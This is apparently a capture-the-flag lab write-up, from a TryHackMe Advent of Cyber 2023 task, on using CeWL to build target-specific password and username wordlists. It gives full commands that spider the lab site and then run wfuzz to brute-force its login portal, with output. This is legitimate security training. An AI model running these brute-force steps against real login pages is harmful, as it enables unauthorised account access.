The AntarctiCrafts company, globally renowned for its avant-garde ice sculptures and toys, runs a portal facilitating confidential communications between its employees stationed in the extreme environments of the North and South Poles. However, a recent security breach has sent ripples through the organisation.

After a thorough investigation, the security team discovered that a notorious individual named McGreedy, known for his dealings in the dark web, had sold the company's credentials. This sale paved the way for a random hacker from the dark web to exploit the portal. The logs point to a brute-force attack. Normally, brute-forcing takes a long time. But in this case, the hacker gained access with only a few tries. It seems that the attacker had a customised wordlist. Perhaps they used a custom wordlist generator like CeWL. Let's try to test it out ourselves!

**Learning Objectives**

- What is CeWL?
- What are the capabilities of CeWL?
- How can we leverage CeWL to generate a custom wordlist from a website?
- How can we customise the tool's output for specific tasks?

**Overview**

CeWL (pronounced "cool") is a custom word list generator tool that spiders websites to create word lists based on the site's content. Spidering, in the context of web security and penetration testing, refers to the process of automatically navigating and cataloguing a website's content, often to retrieve the site structure, content, and other relevant details. This capability makes CeWL especially valuable to penetration testers aiming to brute-force login pages or uncover hidden directories using organisation-specific terminology.

Beyond simple wordlist generation, CeWL can also compile a list of email addresses or usernames identified in team members' page links. Such data can then serve as potential usernames in brute-force operations.

**How to use CeWL?**

In the terminal, type ```cewl -h``` to see a list of all the options it accepts, complete with their descriptions.

```
$ cewl -h
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Usage: cewl [OPTIONS] ... 

    OPTIONS:
	-h, --help: Show help.
	-k, --keep: Keep the downloaded file.
	-d ,--depth : Depth to spider to, default 2.
	-m, --min_word_length: Minimum word length, default 3.
	-x, --max_word_length: Maximum word length, default unset.
	-o, --offsite: Let the spider visit other sites.
	--exclude: A file containing a list of paths to exclude
	--allowed: A regex pattern that path must match to be followed
	-w, --write: Write the output to the file.
	-u, --ua : User agent to send.
	-n, --no-words: Don't output the wordlist.
	-g , --groups : Return groups of words as well
	--lowercase: Lowercase all parsed words
	--with-numbers: Accept words with numbers in as well as just letters
	--convert-umlauts: Convert common ISO-8859-1 (Latin-1) umlauts (ä-ae, ö-oe, ü-ue, ß-ss)
	-a, --meta: include meta data.
	--meta_file file: Output file for meta data.
	-e, --email: Include email addresses.
	--email_file : Output file for email addresses.
	--meta-temp-dir : The temporary directory used by exiftool when parsing files, default /tmp.
	-c, --count: Show the count for each word found.
	-v, --verbose: Verbose.
	--debug: Extra debug information.
[--snip--]
```

This will provide a full list of options to further customise your wordlist generation process. If CeWL is not installed in your VM, you may install it by using the command ```sudo apt-get install cewl -y```

To generate a basic wordlist from a website, use the following command:

```
user@tryhackme$ cewl http://MACHINE_IP                                     
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Start
End
and
the
AntarctiCrafts
[--snip--]
```

To save the wordlist generated to a file, you can use the command below:

```
user@tryhackme$ cewl http://MACHINE_IP -w output.txt
user@tryhackme$ ls
output.txt
```

**Why CeWL?**

CeWL is a wordlist generator that is unique compared to other tools available. While many tools rely on pre-defined lists or common dictionary attacks, CeWL creates custom wordlists based on web page content. Here's why CeWL stands out:

1. Target-specific wordlists: CeWL crafts wordlists specifically from the content of a targeted website. This means that the generated list is inherently tailored to the vocabulary and terminology used on that site. Such custom lists can increase the efficiency of brute-forcing tasks.
2. Depth of search: CeWL can spider a website to a specified depth, thereby extracting words from not just one page but also from linked pages up to the set depth.
3. Customisable outputs: CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This level of customisation can be advantageous for targeting specific types of credentials or vulnerabilities.
4. Built-in features: While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
5. Efficiency: Given its customisability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
6. Integration with other tools: Being command-line based, CeWL can be integrated seamlessly into automated workflows, and its outputs can be directly fed into other cyber security tools.
7. Actively maintained: CeWL is actively maintained and updated. This means it stays relevant and compatible with contemporary security needs and challenges.

In conclusion, while there are many wordlist generators out there, CeWL offers a distinct approach by crafting lists based on a target's own content. This can often provide a strategic edge in penetration testing scenarios.

**How To Customise the Output for Specific Tasks**

CeWL provides a lot of options that allow you to tailor the wordlist to your needs:

1. Specify spidering depth: The ```-d``` option allows you to set how deep CeWL should spider. For example, to spider two links deep: ```cewl http://10.10.164.84 -d 2 -w output1.txt```
2. Set minimum and maximum word length: Use the ```-m``` and ```-x``` options respectively. For instance, to get words between 5 and 10 characters: ```cewl http://10.10.164.84 -m 5 -x 10 -w output2.txt```
3. Handle authentication: If the target site is behind a login, you can use the ```-a``` flag for form-based authentication.
4. Custom extensions: The ```--with-numbers``` option will append numbers to words, and using ```--extension``` allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
5. Follow external links: By default, CeWL doesn't spider external sites, but using the ```--offsite``` option allows you to do so.

**Practical Challenge**

To put our theoretical knowledge into practice, we'll attempt to gain access to the portal located at ```http://10.10.164.84/login.php```

Your goal for this task is to find a valid login credential in the login portal. You might want to follow the step-by-step tutorial below as a guide.

1. Create a password list using CeWL: Use the AntarctiCrafts homepage to generate a wordlist that could potentially hold the key to the portal.

```
user@tryhackme$ cewl -d 2 -m 5 -w passwords.txt http://10.10.164.84 --with-numbers
user@tryhackme$ cat passwords.txt
telephone
support
Image
Professional
Stuffs
Ready
Business
Isaias
Security
Daniel
[--snip--]
```

Hint: Keep an eye out for AntarctiCrafts-specific terminology or phrases that are likely to resonate with the staff, as these could become potential passwords.

2. Create a username list using CeWL: Use the AntarctiCrafts' Team Members page to generate a wordlist that could potentially contain the usernames of the employees.

```
user@tryhackme$ cewl -d 0 -m 5 -w usernames.txt http://10.10.164.84/team.php --lowercase
user@tryhackme$ cat usernames.txt
start
antarcticrafts
stylesheet
about
contact
services
sculptures
libraries
template
spinner
[--snip--]
```

3. Brute-force the login portal using wfuzz: With your wordlist ready and the list of usernames from the Team Members page, it's time to test the login portal. Use wfuzz to brute-force the ```/login.php```.

What is wfuzz? Wfuzz is a tool designed for brute-forcing web applications. It can be used to find resources not linked directories, servlets, scripts, etc, brute-force GET and POST parameters for checking different kinds of injections (SQL, XSS, LDAP), brute-force forms parameters (user/password) and fuzzing.

```
user@tryhackme$ wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.164.84/login.php -d "username=FUZZ&password=FUZ2Z"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.164.84/login.php
Total requests: 60372

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000018052:   302        124 L    323 W      5047 Ch     "REDACTED - REDACTED"                                

Total time: 412.9068
Processed Requests: 60372
Filtered Requests: 60371
Requests/sec.: 146.2121
```

In the command above:

- ```-z file,usernames.txt``` loads the usernames list.
- ```-z file,passwords.txt``` uses the password list generated by CeWL.
- ```--hs "Please enter the correct credentials"``` hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
- ```-u``` specifies the target URL.
- ```-d "username=FUZZ&password=FUZ2Z"``` provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.
Note: The output above contains the word REDACTED since it contains the correct combination of username and password.

4. The login portal of the application is located at ```http://10.10.164.84/login.php```. Use the credentials you got from the brute-force attack to log in to the application.

![bwebmail](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/37b1ba7e-e9d7-4351-96de-6dc805f403c8)

**Conclusion**

AntarctiCrafts' unexpected breach highlighted the power of specialised brute-force attacks. The swift and successful unauthorised access suggests the attacker likely employed a unique, context-specific wordlist, possibly curated using tools like CeWL. This tool can scan a company's public content to create a wordlist enriched with unique jargon and terminologies.

The breach underscores the dual nature of such tools -- while invaluable for security assessments, they can also be potent weapons when misused. For AntarctiCrafts, this incident amplifies the significance of robust security measures and consistent awareness of potential threats.

**Q/A**

![meowowowow](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/8e4b8c61-265d-4411-ba8f-7d754b60fb52)

![answa](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/4c61220b-b44f-4778-82bf-949520df71ab)


